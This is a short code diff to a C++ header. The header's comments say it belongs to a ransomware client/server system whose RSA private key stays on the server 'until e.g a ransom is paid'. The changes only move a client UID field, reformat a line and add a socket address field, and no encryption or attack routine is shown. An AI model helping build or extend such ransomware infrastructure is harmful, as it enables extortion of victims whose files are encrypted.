@@ -25,7 +25,7 @@ public:
         The rsa private key used to decrypt encrypted files with 
         client public rsa key. only on server until e.g a ransom is paid
     */
-    std::string     RSAPrivateKey;
+    std::string    RSAPrivateKey;
 
     /*
         Implementation for event handling- to wait
@@ -40,6 +40,12 @@ public:
     BOOL           ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
     ClientResponse RecentClientResponse;
     ClientResponse LastClientResponse;
+
+    /*
+        UID is assigned by the server .Used to perform commands on one client.
+        Only used on the server. On client, will always remain - 1.
+    */
+    long          ClientUID = -1;
 
     inline long   GenerateCUID() {
         std::default_random_engine generator;
@@ -119,7 +125,6 @@ protected:
 
     // Further details on client
     Server        ConnectedServer = {0};          // Information on the clients connected server
-
 #endif
 
     SOCKET        UDPSocket       = INVALID_SOCKET;
@@ -134,11 +139,7 @@ protected:
     */
     std::string   RSAPublicKey;         
 
-    /*
-        UID is assigned by the server .Used to perform commands on one client.
-        Only used on the server. On client, will always remain - 1.
-    */ 
-    long          ClientUID       = -1;           
+    sockaddr_in   AddressInfo; // client addr info
 };
 
 
